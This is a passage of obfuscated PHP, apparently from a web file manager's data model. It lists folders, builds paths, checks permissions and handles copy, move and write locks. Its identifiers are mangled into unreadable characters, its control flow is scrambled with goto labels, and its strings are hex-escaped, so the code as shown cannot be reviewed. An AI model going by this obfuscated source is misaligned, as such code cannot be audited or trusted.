$b•Í»ı¥ÁÁ[372]); $bã´å≥’ø = array_to_keyvalue_group($fÜƒÜôâô—, $b•Í»ı¥ÁÁ[85], $b•Í»ı¥ÁÁ[398]); $Bç°˘ó˜≥ë = array_to_keyvalue($B¡ﬁ“–¬≤, $b•Í»ı¥ÁÁ[85]); goto EóÍƒ£¢ëë; b£ª∑¢«…∆: } protected function _listAppendChildren(&$c©çØﬁÉ•·, $cÉòúÎÛÇõ) { goto B»∫≤Ω◊ÿ§; B»∫≤Ω◊ÿ§: $D“éü¨≤ú≤ =& $_SERVER[Æ¡î¢≠¯™]; $B≥≤º®°êﬂ = $D“éü¨≤ú≤[66]; $CÔ‰ßê÷¬ã = array(); goto aÎ∫°Ñ›æø; aÎ∫°Ñ›æø: $fÀ–ÓÜ´ô = 1024 * 50; $c©çØﬁÉ•· = is_array($c©çØﬁÉ•·) ? $c©çØﬁÉ•· : array(); $c„Ì‡ıéâπ = count($c©çØﬁÉ•·); goto f’èÙªò´Œ; f’èÙªò´Œ: $Aæ¥ø˘–«Ö = $this->tablePrefix . $this->tableName; for ($e—´òÓ§ = 0; $e—´òÓ§ < $c„Ì‡ıéâπ; $e—´òÓ§++) { $D⁄É◊Éå¬ = intval($c©çØﬁÉ•·[$e—´òÓ§][$D“éü¨≤ú≤[401]]); if ($c©çØﬁÉ•·[$e—´òÓ§][$D“éü¨≤ú≤[375]]) { $FûêáåûÇ∑ = $c©çØﬁÉ•·[$e—´òÓ§][$D“éü¨≤ú≤[374]]; $B≥≤º®°êﬂ .= "\x53\105\x4c\105\x43\124\x20\52\x20\106\122\x4f\115\x20\x28\x53\105\x4c\105\103\124\40\x27{$FûêáåûÇ∑}\137\x68\x61\163\x46\x69\154\145\x27\x20\141\x73\40\x68\x61\x73\x2c\143\157\165\x6e\x74\x28\61\x29\40\141\163\x20\x68\141\163\x43\157\165\156\x74\40\106\x52\x4f\115\x20\140{$Aæ¥ø˘–«Ö}\140\40\xa\x9\11\x9\11\11\167\x68\145\x72\x65\40\160\141\162\x65\x6e\164\111\x44\75{$FûêáåûÇ∑}\x20\141\x6e\144\x20\x69\163\106\x6f\154\x64\145\x72\75\x30\x20\x61\x6e\x64\x20\151\163\104\145\x6c\145\x74\x65\75{$D⁄É◊Éå¬}\51\40\x61\163\x20\x74\142\x31\137{$FûêáåûÇ∑}\40\165\156\151\x6f\156\40\141\154\x6c\40\12\11\x9\x9\x9\x9\x53\105\x4c\105\x43\124\40\52\x20\x46\122\x4f\115\x20\x28\123\105\114\105\x43\x54\40\x27{$FûêáåûÇ∑}\137\150\141\x73\x46\157\x6c\x64\x65\x72\47\x20\141\x73\40\150\x61\x73\x46\x69\x6c\145\54\x63\157\x75\156\x74\x28\x31\x29\x20\x61\163\x20\150\141\x73\x43\157\165\x6e\x74\40\106\x52\117\x4d\40\140{$Aæ¥ø˘–«Ö}\x60\40\xa\x9\x9\x9\x9\x9\x77\150\145\162\145\x20\160\141\x72\145\156\164\111\x44\75{$FûêáåûÇ∑}\40\x61\x6e\144\40\151\163\x46\x6f\154\144\145\x72\75\x31\40\141\156\144\40\x69\163\104\145\x6c\145\164\x65\75{$D⁄É◊Éå¬}\x29\x20\x61\163\x20\164\x62\x32\x5f{$FûêáåûÇ∑}\40\165\156\151\x6f\156\x20\141\154\154\x20"; } if ((strlen($B≥≤º®°êﬂ) >= $fÀ–ÓÜ´ô || $e—´òÓ§ == $c„Ì‡ıéâπ - 1) && $B≥≤º®°êﬂ) { $B≥≤º®°êﬂ = substr($B≥≤º®°êﬂ, 0, -strlen($D“éü¨≤ú≤[453])); $a„€¬èÀû‹ = $this->query($B≥≤º®°êﬂ); $CÔ‰ßê÷¬ã = array_merge($CÔ‰ßê÷¬ã, $a„€¬èÀû‹); $B≥≤º®°êﬂ = $D“éü¨≤ú≤[33]; } } $CÔ‰ßê÷¬ã = array_to_keyvalue($CÔ‰ßê÷¬ã, $D“éü¨≤ú≤[454]); goto cãú®É©¯Ÿ; cãú®É©¯Ÿ: foreach ($c©çØﬁÉ•· as &$c´ªè»øƒ°) { if ($c´ªè»øƒ°[$D“éü¨≤ú≤[375]]) { unset($c´ªè»øƒ°[$D“éü¨≤ú≤[377]]); $c´ªè»øƒ°[$D“éü¨≤ú≤[199]] = intval($CÔ‰ßê÷¬ã[$c´ªè»øƒ°[$D“éü¨≤ú≤[374]] . $D“éü¨≤ú≤[455]][$D“éü¨≤ú≤[456]]); $c´ªè»øƒ°[$D“éü¨≤ú≤[198]] = intval($CÔ‰ßê÷¬ã[$c´ªè»øƒ°[$D“éü¨≤ú≤[374]] . $D“éü¨≤ú≤[457]][$D“éü¨≤ú≤[456]]); } } goto e≈ÙÈ›®ﬁÙ; e≈ÙÈ›®ﬁÙ: } protected function _listAppendAuth(&$e Ê´¬„π◊) { goto F⁄‡’àÒ™¡; F⁄‡’àÒ™¡: $BØä¥¶⁄ßå =& $_SERVER[Æ¡î¢≠¯™]; if (!defined($BØä¥¶⁄ßå[431])) { return; } $CπﬂÉä≤ﬂ∂ = array(); goto b„‰∑èîÚ; b„‰∑èîÚ: foreach ($e Ê´¬„π◊ as $aœÍÖæÉ¢˜) { if ($aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[376]] == self::TYPE_GROUP) { $CπﬂÉä≤ﬂ∂[] = $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[374]]; } } if (!$CπﬂÉä≤ﬂ∂) { return; } $eéÔÈ˘°„º = array_to_keyvalue($e Ê´¬„π◊, $BØä¥¶⁄ßå[374]); goto bé–¨∞‡¿»; bé–¨∞‡¿»: $Dâ¥Æ´éêì = Model($BØä¥¶⁄ßå[458])->getSourceList($CπﬂÉä≤ﬂ∂, $eéÔÈ˘°„º); foreach ($e Ê´¬„π◊ as $DËÜÏ≥ÑΩ“ => &$aœÍÖæÉ¢˜) { $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]] = $Dâ¥Æ´éêì[$aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[374]]]; if (!$aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]] && $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[376]] == self::TYPE_GROUP) { $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]] = Action($BØä¥¶⁄ßå[459])->pathGroupAuthMake($aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[460]]); if (!$aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]] && !_get($GLOBALS, $BØä¥¶⁄ßå[461])) { $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[196]] = !1; $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[195]] = !1; } } if ($aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]]) { $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[196]] = AuthModel::authCheckEdit($aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]][$BØä¥¶⁄ßå[382]]); $aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[195]] = AuthModel::authCheckView($aœÍÖæÉ¢˜[$BØä¥¶⁄ßå[381]][$BØä¥¶⁄ßå[382]]); } $this->groupPathDisplay($aœÍÖæÉ¢˜); } goto fÒ„öÇïÊ‚; fÒ„öÇïÊ‚: } public function groupPathDisplay(&$bçèÇ”ö„¯) { goto D⁄ƒ„⁄Ω¬Ï; C•îä¿¿û‡: $bçèÇ”ö„¯[$fØ√ŒêÆØ‚[468]] = $Dè∫†êàÌÜ . $E÷∑ÂôŒÖí[$fØ√ŒêÆØ‚[396]][$fØ√ŒêÆØ‚[374]]; goto CÑçÒ∆à«¶; A®ô¿„ûÖ„: $EËÉÔ◊ìø∞ = $this->parentLevelArray($E÷∑ÂôŒÖí[$fØ√ŒêÆØ‚[463]]); $Dè∫†êàÌÜ = $fØ√ŒêÆØ‚[33]; foreach ($EËÉÔ◊ìø∞ as $fÑ»îºº”∂) { $fã”°ÈÃÏÍ = Model($fØ√ŒêÆØ‚[462])->getInfo($fÑ»îºº”∂); $Dè∫†êàÌÜ .= $fã”°ÈÃÏÍ[$fØ√ŒêÆØ‚[396]][$fØ√ŒêÆØ‚[374]] . $fØ√ŒêÆØ‚[47]; } goto cêÚ¡ı…Ñı; cêÚ¡ı…Ñı: $bçèÇ”ö„¯[$fØ√ŒêÆØ‚[464]] = $E÷∑ÂôŒÖí[$fØ√ŒêÆØ‚[465]]; $bçèÇ”ö„¯[$fØ√ŒêÆØ‚[385]] = $E÷∑ÂôŒÖí[$fØ√ŒêÆØ‚[463]]; $bçèÇ”ö„¯[$fØ√ŒêÆØ‚[466]] = $E÷∑ÂôŒÖí[$fØ√ŒêÆØ‚[467]]; goto C•îä¿¿û‡; D⁄ƒ„⁄Ω¬Ï: $fØ√ŒêÆØ‚ =& $_SERVER[Æ¡î¢≠¯™]; if ($bçèÇ”ö„¯[$fØ√ŒêÆØ‚[376]] != self::TYPE_GROUP) { return; } $E÷∑ÂôŒÖí = Model($fØ√ŒêÆØ‚[462])->getInfo($bçèÇ”ö„¯[$fØ√ŒêÆØ‚[460]]); goto A®ô¿„ûÖ„; CÑçÒ∆à«¶: } protected function _listAppendPath(&$b´ÕŸÍﬂ§ü) { goto BÌΩ¿ú¡œ’; b≠Ì∂≈ôÊè: $FÿÏ¢ÍÓë√ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($b´ÕŸÍﬂ§ü as &$bå÷““ö€ë) { goto düπø¿˘ç´; düπø¿˘ç´: $E‰…¿∫ÖØÎ = $this->parentLevelArray($bå÷““ö€ë[$EÌò§¯’’§[463]]); $FõÿœáÏÊ‹ = $this->_listAppendPathRoot($bå÷““ö€ë, $E‰…¿∫ÖØÎ); foreach ($E‰…¿∫ÖØÎ as $dÑÔ∑µìçÂ) { if (isset($C⁄˘„∏Î≈˜[$dÑÔ∑µìçÂ])) { $FõÿœáÏÊ‹ .= $C⁄˘„∏Î≈˜[$dÑÔ∑µìçÂ] . $EÌò§¯’’§[8]; } } goto DõŒë®ªº¿; DõŒë®ªº¿: if ($E‰…¿∫ÖØÎ) { $FõÿœáÏÊ‹ .= $bå÷““ö€ë[$EÌò§¯’’§[28]]; } if ($bå÷““ö€ë[$EÌò§¯’’§[375]]) { $FõÿœáÏÊ‹ .= $EÌò§¯’’§[8]; } $bå÷““ö€ë[$EÌò§¯’’§[470]] = str_replace($EÌò§¯’’§[471], $EÌò§¯’’§[8], $FõÿœáÏÊ‹); goto Dèéπ¶Ü≤; Dèéπ¶Ü≤: $CÕâ¶„íä† = trim($bå÷““ö€ë[$EÌò§¯’’§[470]], $EÌò§¯’’§[8]); if ($bå÷““ö€ë[$EÌò§¯’’§[465]] == $EÌò§¯’’§[472] && $CÕâ¶„íä†) { $bå÷““ö€ë[$EÌò§¯’’§[28]] = $CÕâ¶„íä†; } $this->_listAppendPathRecycle($bå÷““ö€ë, $E‰…¿∫ÖØÎ, $FÿÏ¢ÍÓë√); goto aêî†æ”¢⁄; aêî†æ”¢⁄: } goto bïÖâ÷ÒÇ⁄; BÌΩ¿ú¡œ’: $EÌò§¯’’§ =& $_SERVER[Æ¡î¢≠¯™]; $C⁄˘„∏Î≈˜ = array(); foreach ($b´ÕŸÍﬂ§ü as &$bå÷““ö€ë) { $C⁄˘„∏Î≈˜[$bå÷““ö€ë[$EÌò§¯’’§[374]]] = $bå÷““ö€ë[$EÌò§¯’’§[28]]; $E‰…¿∫ÖØÎ = $this->parentLevelArray($bå÷““ö€ë[$EÌò§¯’’§[463]]); array_shift($E‰…¿∫ÖØÎ); foreach ($E‰…¿∫ÖØÎ as $dÑÔ∑µìçÂ) { if (!isset($C⁄˘„∏Î≈˜[$dÑÔ∑µìçÂ])) { $C⁄˘„∏Î≈˜[$dÑÔ∑µìçÂ] = 0; } } } goto e’˜…∞•ûß; e’˜…∞•ûß: $BÎ°∞ÌåÏá = array(); foreach ($C⁄˘„∏Î≈˜ as $A®⁄‘∫‡Ôî => $cñ€⁄‹Ñ†™) { if (!$cñ€⁄‹Ñ†™) { $BÎ°∞ÌåÏá[] = $A®⁄‘∫‡Ôî; } } if ($BÎ°∞ÌåÏá) { $A´ùüíøÙ£ = array($EÌò§¯’’§[388] => array($EÌò§¯’’§[389], $BÎ°∞ÌåÏá)); if (count($BÎ°∞ÌåÏá) == 1) { $B¬ü◊®ñº’ = $this->sourceInfo($BÎ°∞ÌåÏá[0]); $B¬ü◊®ñº’ = is_array($B¬ü◊®ñº’) ? array($B¬ü◊®ñº’) : !1; } else { $B¬ü◊®ñº’ = $this->field($EÌò§¯’’§[469])->where($A´ùüíøÙ£)->select(); } $a⁄ÓÀ’É‰∏ = array_to_keyvalue($B¬ü◊®ñº’, $EÌò§¯’’§[374], $EÌò§¯’’§[28]); $C⁄˘„∏Î≈˜ = array_merge_index($C⁄˘„∏Î≈˜, $a⁄ÓÀ’É‰∏); } goto b≠Ì∂≈ôÊè; bïÖâ÷ÒÇ⁄: } private function _listAppendPathRecycle(&$eª≠≤ÇÖò∞, $CÆ«¬’‹ÚÎ, $D±ΩÕ÷É¬æ) { goto b·ó≠Ü±õã; cÏäö∏çïå: $eª≠≤ÇÖò∞[$féÿÊÔçàå[463]] = $féÿÊÔçàå[474] . implode($féÿÊÔçàå[47], array_slice($CÆ«¬’‹ÚÎ, 1)) . $féÿÊÔçàå[47]; if ($eª≠≤ÇÖò∞[$féÿÊÔçàå[374]] == $D±ΩÕ÷É¬æ) { $eª≠≤ÇÖò∞[$féÿÊÔçàå[463]] = $féÿÊÔçàå[474]; $eª≠≤ÇÖò∞[$féÿÊÔçàå[465]] = $féÿÊÔçàå[472]; $eª≠≤ÇÖò∞[$féÿÊÔçàå[28]] = LNG($féÿÊÔçàå[473]); } $eª≠≤ÇÖò∞[$féÿÊÔçàå[475]] = $féÿÊÔçàå[476]; goto fê∂èÁº˘Á; b·ó≠Ü±õã: $féÿÊÔçàå =& $_SERVER[Æ¡î¢≠¯™]; if (intval($eª≠≤ÇÖò∞[$féÿÊÔçàå[376]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($D±ΩÕ÷É¬æ, $CÆ«¬’‹ÚÎ) && $eª≠≤ÇÖò∞[$féÿÊÔçàå[374]] != $D±ΩÕ÷É¬æ) { return; } goto FÓØâòŒ≈≤; FÓØâòŒ≈≤: $E‹ë±ø¯æ· = explode($féÿÊÔçàå[8], trim($eª≠≤ÇÖò∞[$féÿÊÔçàå[470]], $féÿÊÔçàå[8])); $e‰∆Úı≠¿ø = implode($féÿÊÔçàå[8], array_slice($E‹ë±ø¯æ·, 2)); $eª≠≤ÇÖò∞[$féÿÊÔçàå[470]] = $féÿÊÔçàå[8] . LNG($féÿÊÔçàå[473]) . $féÿÊÔçàå[8] . ltrim($e‰∆Úı≠¿ø, $féÿÊÔçàå[8]); goto cÏäö∏çïå; fê∂èÁº˘Á: } protected function _listAppendPathRoot(&$AÂﬁ©Èü∞¥, $bÇ⁄“ÕÃé«) { $D√¯ÙÙıåΩ =& $_SERVER[Æ¡î¢≠¯™]; $D˘ÂòØ≠∞å = $D√¯ÙÙıåΩ[33]; if ($AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[376]] == self::TYPE_USER) { if (defined($D√¯ÙÙıåΩ[431]) && $AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[460]] == USER_ID) { $D˘ÂòØ≠∞å = LNG($D√¯ÙÙıåΩ[477]); if (!$bÇ⁄“ÕÃé«) { $AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[28]] = $D˘ÂòØ≠∞å; } } else { $D‡ÜâåâãÎ = Model($D√¯ÙÙıåΩ[478])->getInfoSimple($AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[460]]); $D˘ÂòØ≠∞å = LNG($D√¯ÙÙıåΩ[479]) . $D√¯ÙÙıåΩ[164] . $D‡ÜâåâãÎ[$D√¯ÙÙıåΩ[28]] . $D√¯ÙÙıåΩ[480]; } } else { if ($AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[376]] == self::TYPE_GROUP) { $D‡ÜâåâãÎ = Model($D√¯ÙÙıåΩ[462])->getInfoSimple($AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[460]]); $D˘ÂòØ≠∞å = $D‡ÜâåâãÎ[$D√¯ÙÙıåΩ[28]]; } else { if ($AÂﬁ©Èü∞¥[$D√¯ÙÙıåΩ[376]] == self::TYPE_SYSTEM) { $D‡ÜâåâãÎ = $this->sourceInfo($bÇ⁄“ÕÃé«[0], !0); $D˘ÂòØ≠∞å = $D‡ÜâåâãÎ[$D√¯ÙÙıåΩ[28]]; } } } $D˘ÂòØ≠∞å = $D˘ÂòØ≠∞å ? $D√¯ÙÙıåΩ[8] . $D˘ÂòØ≠∞å . $D√¯ÙÙıåΩ[8] : $D√¯ÙÙıåΩ[8]; return $D˘ÂòØ≠∞å; } protected function _listAppendUser(&$B’äì±Òòı) { $E¬≠ôÍŸÂÀ =& $_SERVER[Æ¡î¢≠¯™]; $Eäõ≈ÔñßŒ = array_to_keyvalue($B’äì±Òòı, $E¬≠ôÍŸÂÀ[33], $E¬≠ôÍŸÂÀ[383]); $CôêÍÀÿÏò = array_to_keyvalue($B’äì±Òòı, $E¬≠ôÍŸÂÀ[33], $E¬≠ôÍŸÂÀ[384]); $FÀçªÃ¶ªµ = array_merge($Eäõ≈ÔñßŒ, $CôêÍÀÿÏò); $a∆Ô™Öóƒ≈ = Model($E¬≠ôÍŸÂÀ[481])->userListInfo($FÀçªÃ¶ªµ); foreach ($B’äì±Òòı as &$BØéËäÎö±) { $eˆ”ä∏ÉÁî = $BØéËäÎö±[$E¬≠ôÍŸÂÀ[383]]; $BØéËäÎö±[$E¬≠ôÍŸÂÀ[383]] = $a∆Ô™Öóƒ≈[$eˆ”ä∏ÉÁî] ? $a∆Ô™Öóƒ≈[$eˆ”ä∏ÉÁî] : !1; $eˆ”ä∏ÉÁî = $BØéËäÎö±[$E¬≠ôÍŸÂÀ[384]]; $BØéËäÎö±[$E¬≠ôÍŸÂÀ[384]] = $a∆Ô™Öóƒ≈[$eˆ”ä∏ÉÁî] ? $a∆Ô™Öóƒ≈[$eˆ”ä∏ÉÁî] : !1; if (isset($BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]]) && $BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]][$E¬≠ôÍŸÂÀ[482]]) { $Cé≠ÍÛô‘π = $GLOBALS[$E¬≠ôÍŸÂÀ[6]][$E¬≠ôÍŸÂÀ[94]][$E¬≠ôÍŸÂÀ[483]]; if ($BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]][$E¬≠ôÍŸÂÀ[484]] <= time() - $Cé≠ÍÛô‘π) { $this->metaSet($BØéËäÎö±[$E¬≠ôÍŸÂÀ[374]], $E¬≠ôÍŸÂÀ[482], null); $this->metaSet($BØéËäÎö±[$E¬≠ôÍŸÂÀ[374]], $E¬≠ôÍŸÂÀ[484], null); unset($BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]][$E¬≠ôÍŸÂÀ[482]]); continue; } $a⁄ü€™´›Ö = $BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]][$E¬≠ôÍŸÂÀ[482]]; $BØéËäÎö±[$E¬≠ôÍŸÂÀ[421]][$E¬≠ôÍŸÂÀ[485]] = Model($E¬≠ôÍŸÂÀ[481])->getInfoSimpleOuter($a⁄ü€™´›Ö); } } } public function parentLevelArray($CπËﬁø¢È¢) { $C£ñïƒÍÿó =& $_SERVER[Æ¡î¢≠¯™]; $CπËﬁø¢È¢ = explode($C£ñïƒÍÿó[47], trim($CπËﬁø¢È¢, $C£ñïƒÍÿó[47])); return array_remove_value($CπËﬁø¢È¢, $C£ñïƒÍÿó[472]); } public function listAll($FÆàﬁˆÎ∂π) { goto bÀåêÁ£∞£; aÊûÓµçªÜ: $this->_listAppendAuth($bÕ»—ºÍòÊ); $this->_listAppendUser($bÕ»—ºÍòÊ); $this->_listAppendPath($bÕ»—ºÍòÊ); goto aæùø«ˆå˘; bÀåêÁ£∞£: $D‡äò»óå∆ =& $_SERVER[Æ¡î¢≠¯™]; $FÀÃÖ⁄Ÿ¿‚ = $this->sourceInfo($FÆàﬁˆÎ∂π); $b¥≈ç€“äª = array($D‡äò»óå∆[486] => array($D‡äò»óå∆[487], $FÀÃÖ⁄Ÿ¿‚[$D‡äò»óå∆[463]] . $FÆàﬁˆÎ∂π . $D‡äò»óå∆[488]), $D‡äò»óå∆[489] => 0); goto EêºÜÖÕÃè; EêºÜÖÕÃè: $AÌáÇè¥Ñ≠ = $D‡äò»óå∆[490]; $BÉ•¬åîÏ“ = "\114\105\106\124\x20\112\x4f\111\116\40{$this->tablePrefix}\151\157\137\146\151\x6c\145\x20\146\x69\x6c\145\x20\x6f\x6e\x20\x73\x6f\165\162\143\145\56\x66\x69\x6c\x65\111\104\40\x3d\x20\146\x69\154\145\56\x66\151\154\145\x49\104"; $bÕ»—ºÍòÊ = $this->alias($D‡äò»óå∆[491])->field($AÌáÇè¥Ñ≠)->where($b¥≈ç€“äª)->join($BÉ•¬åîÏ“)->select(); goto aÊûÓµçªÜ; aæùø«ˆå˘: $bÕ»—ºÍòÊ = array_to_keyvalue($bÕ»—ºÍòÊ, $D‡äò»óå∆[374]); $EÃ£æû¥ﬂê = "\x2f{$FÀÃÖ⁄Ÿ¿‚[$D‡äò»óå∆[28]]}\57"; $EÃ£æû¥ﬂê = $EÃ£æû¥ﬂê == $D‡äò»óå∆[471] ? $D‡äò»óå∆[8] : $EÃ£æû¥ﬂê; goto a⁄Ÿ∏óΩ≈; a⁄Ÿ∏óΩ≈: $a≈•‚Ë˘‰ = array(); foreach ($bÕ»—ºÍòÊ as $aæÜ©ë∫™ì => $f£©è‰⁄…ä) { goto dêí’Çõ∆‘; eÇáë»˜∏Ö: $fÜ±ÖºÆ É = str_replace($D‡äò»óå∆[471], $D‡äò»óå∆[8], $fÜ±ÖºÆ É); $fÜ±ÖºÆ É = str_replace($D‡äò»óå∆[471], $D‡äò»óå∆[8], $fÜ±ÖºÆ É); $fÁá“≤Ñπâ = array($D‡äò»óå∆[392] => str_replace($D‡äò»óå∆[471], $D‡äò»óå∆[8], $fÜ±ÖºÆ É), $D‡äò»óå∆[492] => intval($f£©è‰⁄…ä[$D‡äò»óå∆[375]]), $D‡äò»óå∆[396] => $this->pathInfoFilter($f£©è‰⁄…ä, !0)); goto A·¯¿ºñÜ£; dêí’Çõ∆‘: $cáèÃÉÖõô = $this->parentLevelArray($f£©è‰⁄…ä[$D‡äò»óå∆[463]]); array_shift($cáèÃÉÖõô); $fÜ±ÖºÆ É = $EÃ£æû¥ﬂê; goto f‚¢≈–∂¯È; A·¯¿ºñÜ£: if (!$f£©è‰⁄…ä[$D‡äò»óå∆[375]]) { $fÁá“≤Ñπâ[$D‡äò»óå∆[423]] = $f£©è‰⁄…ä[$D‡äò»óå∆[423]]; $fÁá“≤Ñπâ[$D‡äò»óå∆[493]] = $f£©è‰⁄…ä[$D‡äò»óå∆[85]]; } $a≈•‚Ë˘‰[] = $fÁá“≤Ñπâ; goto d⁄‰ÍŸÕÜ†; f‚¢≈–∂¯È: for ($EÜﬂû¡Ú›Ë = 0; $EÜﬂû¡Ú›Ë < count($cáèÃÉÖõô); $EÜﬂû¡Ú›Ë++) { $fÜ±ÖºÆ É .= $bÕ»—ºÍòÊ[$cáèÃÉÖõô[$EÜﬂû¡Ú›Ë]][$D‡äò»óå∆[28]] . $D‡äò»óå∆[8]; } $fÜ±ÖºÆ É .= $f£©è‰⁄…ä[$D‡äò»óå∆[28]]; if ($f£©è‰⁄…ä[$D‡äò»óå∆[375]]) { $fÜ±ÖºÆ É .= $D‡äò»óå∆[8]; } goto eÇáë»˜∏Ö; d⁄‰ÍŸÕÜ†: } return $a≈•‚Ë˘‰; goto E°´…ÂÖπä; E°´…ÂÖπä: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($eÇé∑œÑÀâ) { goto cΩìë∑æ€ñ; a—î”à‚®á: $d◊Ø˜ñŒØü = 1; $this->_lockEvent($eÇé∑œÑÀâ, array($dæ∫°˜•è‰[495], $dæ∫°˜•è‰[496]), $d◊Ø˜ñŒØü); $this->_lockParent($eÇé∑œÑÀâ, array($dæ∫°˜•è‰[496]), $d◊Ø˜ñŒØü); goto bŒË∏§Ü≈â; bŒË∏§Ü≈â: $this->_lockEvent($eÇé∑œÑÀâ, array($dæ∫°˜•è‰[497], $dæ∫°˜•è‰[498]), $d◊Ø˜ñŒØü); $this->_lockCheckEnd($dæ∫°˜•è‰[494], $eÇé∑œÑÀâ); goto A¡Èøﬁª÷ü; cΩìë∑æ€ñ: $dæ∫°˜•è‰ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $this->_lockCheck($dæ∫°˜•è‰[494], $eÇé∑œÑÀâ); goto a—î”à‚®á; A¡Èøﬁª÷ü: } public function lockCopyEnd($e∂÷ãÛèç“) { $D»‹äœÜ÷ê =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $D¿îÌæ⁄˘€ = 0; $this->_lockEvent($e∂÷ãÛèç“, array($D»‹äœÜ÷ê[495], $D»‹äœÜ÷ê[496]), $D¿îÌæ⁄˘€); $this->_lockParent($e∂÷ãÛèç“, array($D»‹äœÜ÷ê[496]), $D¿îÌæ⁄˘€); $this->_lockEvent($e∂÷ãÛèç“, array($D»‹äœÜ÷ê[497], $D»‹äœÜ÷ê[498]), $D¿îÌæ⁄˘€); } public function lockWriteStart($A∞ÌØƒ¢Â’, $b√åµ¬Òé¿ = '') { goto A¥Æ‡¬ú›¿; B äæÏ¿áÕ: $Dù˜éãËÙ≥ = 1; $this->_lockKey($E©æ¢»∂ı‚[499] . $A∞ÌØƒ¢Â’ . $E©æ¢»∂ı‚[103] . $b√åµ¬Òé¿, $Dù˜éãËÙ≥); $this->_lockEvent($A∞ÌØƒ¢Â’, array($E©æ¢»∂ı‚[494], $E©æ¢»∂ı‚[496]), $Dù˜éãËÙ≥); goto A‰ÔùôÉΩÚ; A¥Æ‡¬ú›¿: $E©æ¢»∂ı‚ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $this->_lockCheck($E©æ¢»∂ı‚[495], $A∞ÌØƒ¢Â’); goto B äæÏ¿áÕ; A‰ÔùôÉΩÚ: $this->_lockParent($A∞ÌØƒ¢Â’, array($E©æ¢»∂ı‚[494], $E©æ¢»∂ı‚[496]), $Dù˜éãËÙ≥); $this->_lockCheckEnd($E©æ¢»∂ı‚[495], $A∞ÌØƒ¢Â’); goto B¶ö°’‡®Ë; B¶ö°’‡®Ë: } public function lockWriteEnd($D¶À†ÊŸÆ—, $cçê∂◊¬∂ò = '') { $cÜÖ¿πú›ò =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $dÎ©íÂ∞ñì = 0; $this->_lockKey($cÜÖ¿πú›ò[499] . $D¶À†ÊŸÆ— . $cÜÖ¿πú›ò[103] . $cçê∂◊¬∂ò, $dÎ©íÂ∞ñì); $this->_lockEvent($D¶À†ÊŸÆ—, array($cÜÖ¿πú›ò[494], $cÜÖ¿πú›ò[496]), $dÎ©íÂ∞ñì); $this->_lockParent($D¶À†ÊŸÆ—, array($cÜÖ¿πú›ò[494], $cÜÖ¿πú›ò[496]), $dÎ©íÂ∞ñì); } public function lockMoveStart($AËåôœÛ´á) { goto aêá≠Ëæ≠«; Bõè†¨¢ﬁé: $b’ˆÙ†¬ö… = 1; $this->_lockKey($cêö∑Âê∂™[500] . $AËåôœÛ´á, $b’ˆÙ†¬ö…); $this->_lockEvent($AËåôœÛ´á, array($cêö∑Âê∂™[494], $cêö∑Âê∂™[495]), $b’ˆÙ†¬ö…); goto d¯≈ó∏„ƒ≥; aêá≠Ëæ≠«: $cêö∑Âê∂™ =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $this->_lockCheck($cêö∑Âê∂™[496], $AËåôœÛ´á); goto Bõè†¨¢ﬁé; d¯≈ó∏„ƒ≥: $this->_lockParent($AËåôœÛ´á, array($cêö∑Âê∂™[494], $cêö∑Âê∂™[496]), $b’ˆÙ†¬ö…); $this->_lockEvent($AËåôœÛ´á, array($cêö∑Âê∂™[501], $cêö∑Âê∂™[497], $cêö∑Âê∂™[498]), $b’ˆÙ†¬ö…); $this->_lockCheckEnd($cêö∑Âê∂™[496], $AËåôœÛ´á); goto Dﬂ»˜ßˆòË; Dﬂ»˜ßˆòË: } public function lockMoveEnd($Bîë‘ªˆ±≈) { goto eä“É˘òåå; fùà·ÜÀπÉ: $this->_lockEvent($Bîë‘ªˆ±≈, array($CÜÏÆ≤‰ïã[501], $CÜÏÆ≤‰ïã[497], $CÜÏÆ≤‰ïã[498]), $dÕ◊›è´åÁ); goto fÕ≈‹ì’¿ã; f€ÙøØ§…î: $this->_lockKey($CÜÏÆ≤‰ïã[500] . $Bîë‘ªˆ±≈, $dÕ◊›è´åÁ); $this->_lockEvent($Bîë‘ªˆ±≈, array($CÜÏÆ≤‰ïã[494], $CÜÏÆ≤‰ïã[495]), $dÕ◊›è´åÁ); $this->_lockParent($Bîë‘ªˆ±≈, array($CÜÏÆ≤‰ïã[494], $CÜÏÆ≤‰ïã[496]), $dÕ◊›è´åÁ); goto fùà·ÜÀπÉ; eä“É˘òåå: $CÜÏÆ≤‰ïã =& $_SERVER[Æ¡î¢≠¯™]; if (!$this->allowLock()) { return; } $dÕ◊›è´åÁ = 0; goto f€ÙøØ§…î; fÕ≈‹ì’¿ã: } private function _lockCheck($c∞™…»ÕŸØ, 